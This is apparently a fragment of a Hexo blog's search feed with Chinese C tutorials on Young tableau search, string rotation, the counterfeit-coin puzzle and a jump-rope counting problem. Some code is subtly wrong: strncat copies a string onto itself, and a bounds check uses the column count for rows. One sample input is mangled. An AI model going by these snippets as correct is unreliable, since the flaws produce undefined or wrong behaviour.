start="9"><li>杨氏矩阵<br>有一个数字矩阵，矩阵的每行从左到右递增，矩阵从上到下是递增的<br>请编写程序在这样的矩阵中查找某个数字是否存在<br>要求时间复杂度小于O（N）</li></ol><p>思路：因为每一行右边最大，所以比较最右边，小了就去掉这一行，直接看下一行，每一列的最下面都是最大的，比较后，小了就去掉这一列，这样就能保住时间复杂度了.</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_num</span><span class="params">(<span class="type">int</span> arr[<span class="number">3</span>][<span class="number">3</span>], <span class="type">int</span> r, <span class="type">int</span> c, <span class="type">int</span> k)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> y = c - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (x &lt; c &amp;&amp; y &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[x][y] &lt; k)</span><br><span class="line">x++;<span class="comment">//加一行</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (arr[x][y] &gt; k)</span><br><span class="line">y--;<span class="comment">//去一列</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">3</span>][<span class="number">3</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,</span><br><span class="line"><span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span> &#125;;</span><br><span class="line"><span class="comment">//查找一个数字，比如7</span></span><br><span class="line"><span class="comment">//可以遍历但时间复杂度就变为O（N^2）</span></span><br><span class="line"><span class="comment">//O(1):不管几个元素都是遍历常数次</span></span><br><span class="line"><span class="type">int</span> k = <span class="number">7</span>;</span><br><span class="line"><span class="comment">//如果找到返回1，否则返回0</span></span><br><span class="line"><span class="type">int</span> ret = find_num(a, <span class="number">3</span>, <span class="number">3</span>, k);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到了\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找不到\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果要返回坐标怎么办（return只能返回一个值）怎么改</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_num</span><span class="params">(<span class="type">int</span> arr[<span class="number">3</span>][<span class="number">3</span>], <span class="type">int</span> *px, <span class="type">int</span> *py, <span class="type">int</span> k)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> y = *py - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (x &lt; *px &amp;&amp; y &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[x][y] &lt; k)</span><br><span class="line">x++;<span class="comment">//加一行</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (arr[x][y] &gt; k)</span><br><span class="line">y--;<span class="comment">//去一列</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">*px = x;</span><br><span class="line">*py = y;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">3</span>][<span class="number">3</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,</span><br><span class="line"><span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span> &#125;;</span><br><span class="line"><span class="type">int</span> k = <span class="number">7</span>;</span><br><span class="line"><span class="type">int</span> x = <span class="number">3</span>;<span class="comment">//行</span></span><br><span class="line"><span class="type">int</span> y = <span class="number">3</span>;<span class="comment">//列</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&amp;x，&amp;y</span></span><br><span class="line"><span class="comment">1.传入参数</span></span><br><span class="line"><span class="comment">2.带回值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> ret = find_num(a, &amp;x, &amp;y, k);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到了\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;下标是:%d %d&quot;</span>, x, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找不到\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/26/pcAUBO8CReSuVKE.png" alt="image.png"></p><h1 id="字符串左旋"><a href="#字符串左旋" class="headerlink" title="字符串左旋"></a>字符串左旋</h1><h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>实现一个函数，可以左旋字符串中的k个字符</p><h2 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h2><p>ABCD左旋第一个字符得到BCDA</p><p>ABCD左旋两个字符得到CDAB</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">string_rotate</span><span class="params">(<span class="type">char</span>* str, <span class="type">int</span> k)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line"><span class="comment">//每次左旋一个字符</span></span><br><span class="line"><span class="type">char</span> tmp = *str;<span class="comment">//首地址 </span></span><br><span class="line"><span class="comment">// 把后面的n-1个字符往前挪 </span></span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len - <span class="number">1</span>; j++) &#123;</span><br><span class="line">*(str + j) = *(str + j + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//tmp再放到最后</span></span><br><span class="line">*(str + len - <span class="number">1</span>) = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr[<span class="number">10</span>] = <span class="string">&quot;ABCDEF&quot;</span>; </span><br><span class="line"><span class="type">int</span> k;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;k);</span><br><span class="line">string_rotate(arr, k);</span><br><span class="line"><span class="built_in">puts</span>(arr);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="神奇的方法"><a href="#神奇的方法" class="headerlink" title="神奇的方法"></a>神奇的方法</h3><p>比如A B C D E F  k &#x3D; 2<br>先逆序 A B  再逆序D E F<br>得到 B A F E D<br>再整体逆序得到<br>D E F A B<br>神奇<br>代码实现加个之前写过的逆序即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">char</span>* left, <span class="type">char</span>* right)</span></span><br><span class="line">&#123; </span><br><span class="line">assert(left);</span><br><span class="line">assert(right); </span><br><span class="line"><span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line"><span class="type">char</span> tmp = *left;</span><br><span class="line">*left = *right;</span><br><span class="line">*right = tmp;</span><br><span class="line">left++;</span><br><span class="line">right--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">string_rotate</span><span class="params">(<span class="type">char</span>* str, <span class="type">int</span> k)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(str);</span><br><span class="line"><span class="type">int</span> n = <span class="built_in">strlen</span>(str);</span><br><span class="line">reverse(str, str + k - <span class="number">1</span>);<span class="comment">//左 </span></span><br><span class="line">reverse(str + k, str + n - <span class="number">1</span>);<span class="comment">//右 </span></span><br><span class="line">reverse(str, str + n - <span class="number">1</span>);<span class="comment">//整体 </span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr[<span class="number">10</span>] = <span class="string">&quot;ABCDEF&quot;</span>; </span><br><span class="line"><span class="type">int</span> k;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;k);</span><br><span class="line">string_rotate(arr, k);</span><br><span class="line"><span class="built_in">puts</span>(arr);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="进一步深入"><a href="#进一步深入" class="headerlink" title="进一步深入"></a>进一步深入</h2><p>写一个函数，判断一个字符串是否是另外一个字符串旋转之后的字符串。</p><h2 id="例：-1"><a href="#例：-1" class="headerlink" title="例："></a>例：</h2><p>给定s1&#x3D;AABCD和s2&#x3D;BCDAA,返回1<br>给定s1&#x3D;abcd和s2&#x3D;ACBD,返回0</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>每转一次都比较以下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">is_string_rotate</span><span class="params">(<span class="type">char</span>* str1, <span class="type">char</span>* str2)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> n = <span class="built_in">strlen</span>(str1);<span class="comment">//5</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="comment">//每次左旋一个字符</span></span><br><span class="line"><span class="type">char</span> tmp = *str1;</span><br><span class="line"><span class="comment">// 把后面的n-1个字符往前挪 </span></span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - <span class="number">1</span>; j++) &#123;</span><br><span class="line">*(str1 + j) = *(str1 + j + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//tmp再放到最后</span></span><br><span class="line">*(str1 + n - <span class="number">1</span>) = tmp;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(str1, str2) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr1[] = <span class="string">&quot;AABCD&quot;</span>; </span><br><span class="line"><span class="type">char</span> arr2[] = <span class="string">&quot;BCDAA&quot;</span>;  </span><br><span class="line"><span class="type">int</span> ret = is_string_rotate(arr1, arr2);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Yes&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><h3 id="神奇的方法-1"><a href="#神奇的方法-1" class="headerlink" title="神奇的方法"></a>神奇的方法</h3><p>将AABCD重复俩遍可以得到所有的反转<br>AABCDAABCD<br>A ABCDA ABCD<br>AA BCDAA BCD<br>………</p><p>改版后的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">is_string_rotate</span><span class="params">(<span class="type">char</span>* str1, <span class="type">char</span>* str2)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(str1);</span><br><span class="line">assert(str2);</span><br><span class="line"><span class="comment">//长度不相等，肯定不是 </span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(str1) != <span class="built_in">strlen</span>(str2))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1.str1字符串的后边追加一个str1</span></span><br><span class="line"><span class="comment">//AABCDAABCD</span></span><br><span class="line"><span class="type">int</span> n = <span class="built_in">strlen</span>(str1); </span><br><span class="line"><span class="built_in">strncat</span>(str1, str1, n);<span class="comment">//追加后面的字符串前n个在前面的字符串 </span></span><br><span class="line"><span class="comment">//2.判断str2是否为str1的子串 </span></span><br><span class="line"><span class="built_in">strstr</span>(str1, str2);<span class="comment">//判断一个字符串是否是另一个字符串的子串 </span></span><br><span class="line"><span class="comment">//返回找到的str2在str1第一次匹配的地址 </span></span><br><span class="line"><span class="type">char</span>* ret = <span class="built_in">strstr</span>(str1, str2);</span><br><span class="line"><span class="keyword">return</span> ret != <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr1[<span class="number">20</span>] = <span class="string">&quot;AABCD&quot;</span>; </span><br><span class="line"><span class="type">char</span> arr2[] = <span class="string">&quot;BCDAA&quot;</span>;  </span><br><span class="line"><span class="type">int</span> ret = is_string_rotate(arr1, arr2);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Yes&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学建模中的问题C解决</title>
      <link href="/2023/03/23/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98C%E8%A7%A3%E5%86%B3/"/>
      <url>/2023/03/23/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98C%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="假币问题"><a href="#假币问题" class="headerlink" title="假币问题"></a>假币问题</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>利有 12 枚银币。其中有 11 枚真币和 1 枚假币。假币看起来和真币没有区别，但是重量不同。但赛利不知道假币比真币轻还是重。于是他向朋友借了一架天平。朋友希望赛利称三次<br>就能找出假币并且确定假币是轻是重。例如:如果赛利用天平称两枚硬币，发现天平平衡，说明两枚都是真的。如果赛利用一枚真币与另一枚银币比较，发现它比真币轻或重，说明它是假币。经过精心安排每次的称量，赛利保证在称三次后确定假币。</p><p><em>Input：</em></p><p>输入有三行，每行表示一次称量的结果。赛利事先将银币标号为 A-L。每次称量的结果用三个以空格隔开的字符串表示： 天平左边放置的硬币 天平右边放置的硬币 平衡状态。 其中平衡状态用，up, down, 或 even表示, 分别为右端高、右端低和平衡。天平左右的硬币数总是相等的。</p><p><em>Output：</em></p><p>输出哪一个标号的银币是假币，并说明它比真币轻还是重(heavy or light)。<br>Sample Input<br>1<br>ABCD EFGH even<br>ABCI EFJK up<br>ABIJ EFGH even<br>Sample Output<br>K is the counterfeit coin and it is light</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>核心（枚举）</p><p>首先，每一个标号的银币都可能是假币，所以需要对每个银币都进行分析，其次题目没说假币是更重还是更轻，所以又要再分俩种情况。</p><p>具体实现则是，读入三次称重结果，对每一枚银币，分更重和更轻俩种情况讨论，看哪种符合读入的结果。</p><p>比如这次的输入，ABCD EFGH even,说明假币不可能在这8枚银币里，但程序仍会对A-H进行分析，再分析I，先假设I更轻，第二个就不满足了，因为up表示右边高，I排除，再分析J，同样<br>先假设J更轻，第三个就不满足了，最后剩一个K，先假设更轻，刚好满足第二个条件。</p><p>所以程序需要实现的就是这三个过程，遍历A-L，假币更重比较一次，假币更轻比较一次。</p><p>用到了strchr(const char str[], int c)，如果在字符串 str 中找到字符 c，则函数返回指向该字符的指针，如果未找到该字符则返回 NULL。假币在天平上肯定出现不平衡，所以找出事先假设好的假币在哪边，再判断。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _NO_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> left[<span class="number">3</span>][<span class="number">7</span>];<span class="comment">//天平左边的银币</span></span><br><span class="line"><span class="type">char</span> right[<span class="number">3</span>][<span class="number">7</span>];<span class="comment">//天平右边的银币</span></span><br><span class="line"><span class="type">char</span> result[<span class="number">3</span>][<span class="number">7</span>];<span class="comment">//称量结果</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isCounterfeitCoin</span><span class="params">(<span class="type">char</span> iCoin, <span class="type">bool</span> isLight)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> t;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);<span class="comment">//t组数据，一组三次</span></span><br><span class="line"><span class="keyword">while</span> (t--) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s %s %s&quot;</span>, &amp;left[i], &amp;right[i], &amp;result[i]);</span><br><span class="line"><span class="comment">//枚举每个银币</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">char</span> iCoin = <span class="string">&#x27;A&#x27;</span>; iCoin &lt;= <span class="string">&#x27;L&#x27;</span>; iCoin++)</span><br><span class="line"><span class="keyword">if</span> (isCounterfeitCoin(iCoin, <span class="literal">true</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c is the counterfeit coin and it is light.\n&quot;</span>, iCoin);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (isCounterfeitCoin(iCoin, <span class="literal">false</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c is the counterfeit coin and it is heavy.\n&quot;</span>, iCoin);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isCounterfeitCoin</span><span class="params">(<span class="type">char</span> iCoin, <span class="type">bool</span> isLight)</span><span class="comment">/*isLight为真则表示假币为轻，否则假币为重*/</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line"><span class="comment">//指向天平俩边的字符串</span></span><br><span class="line"><span class="type">char</span>* pleft;</span><br><span class="line"><span class="type">char</span>* pright;</span><br><span class="line"><span class="keyword">if</span> (isLight) &#123;</span><br><span class="line">pleft = left[i];</span><br><span class="line">pright = right[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">/*如果假设假币是重的isLight为假的，则把称量结果左右对换*/</span></span><br><span class="line">pleft = right[i];</span><br><span class="line">pright = left[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (result[i][<span class="number">0</span>]) &#123;<span class="comment">/*天平右边的情况*/</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>: <span class="comment">// up</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strchr</span>(pright, iCoin) == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>: <span class="comment">//even</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strchr</span>(pleft, iCoin) || <span class="built_in">strchr</span>(pright, iCoin))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strchr</span>(pleft, iCoin) == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/24/9rDY8LeZRhTmzb6.png" alt="image.png"></p><h1 id="跳绳为题-参考自："><a href="#跳绳为题-参考自：" class="headerlink" title="跳绳为题(参考自：)"></a>跳绳为题(参考自：)</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>朋友玩跳绳比赛,要计算在一分钟内跳了多少下.假设每秒钟跳一下,如果中途失败了,则要<br>花三秒钟后才能开始重跳.一般小朋友跳绳一分钟要跳坏好几次.现在给出小朋友每次跳坏时<br>已经跳的总数,求小朋友在一分钟内跳了多少下.(请注意分析示例数据.)</p><p><em>Input:</em></p><p>第一行为 n 个小朋友<br>其余各行,每行第一个整数是跳坏的次数 m,其余 m 个整数是跳坏时累计跳了多少下.</p><p><em>Output:</em></p><p>输出相应小朋友头一分钟内跳了多少下.</p><p>Sample Input</p><p>603<br>12 23 451 17<br>4 10 20 30 40<br>5 10 20 30 40 58<br>6 10 20 30 40 47 60</p><p>Sample Output</p><p>60<br>51<br>57<br>48<br>48<br>47<br>Hint</p><p>提示,在跳绳比赛时,你可能已经超时了,但自己还在计数,但裁判已经停止计时并得到成绩.<br>这里相当与自己计数.因此,并非跳坏的时候都是在前一分钟以内.请注意分析示例数据</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> n, m, x, i, ok, time, s;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span> (n--)</span><br><span class="line">&#123;</span><br><span class="line">time = ok = s = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">time = x + <span class="number">3</span> * i;<span class="comment">//每次停下来后已经用的时间</span></span><br><span class="line"><span class="keyword">if</span> (ok == <span class="number">0</span>)<span class="comment">//未超过一分钟...</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (time &gt;= <span class="number">57</span>)</span><br><span class="line">&#123;</span><br><span class="line">ok = <span class="number">1</span>;</span><br><span class="line">time = (time &gt; <span class="number">60</span>) ? <span class="number">60</span> : time;<span class="comment">//最多跳60次</span></span><br><span class="line">s = time - <span class="number">3</span> * i;</span><br><span class="line"><span class="comment">//剩余的时间不够下一次重新跳了</span></span><br><span class="line"><span class="comment">//跳的次数等于用的时间减去停下来消耗的时间 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (time &lt; <span class="number">57</span> &amp;&amp; i == m - <span class="number">1</span>)</span><br><span class="line"><span class="comment">//最后一次停下来，但是不够60s </span></span><br><span class="line">&#123;</span><br><span class="line">s = <span class="number">60</span> - <span class="number">3</span> * (i + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//这一次后面肯定还要有三秒停下来的时间 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (m == <span class="number">0</span>) ? <span class="number">60</span> : s);<span class="comment">//特判未停下来的情况</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/25/62vp1H7AQYmB9TW.png" alt="image.png"></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>联合查询输入</title>
      <link href="/2023/03/18/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E8%BE%93%E5%85%A5/"/>
      <url>/2023/03/18/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E8%BE%93%E5%85%A5/</url>
      
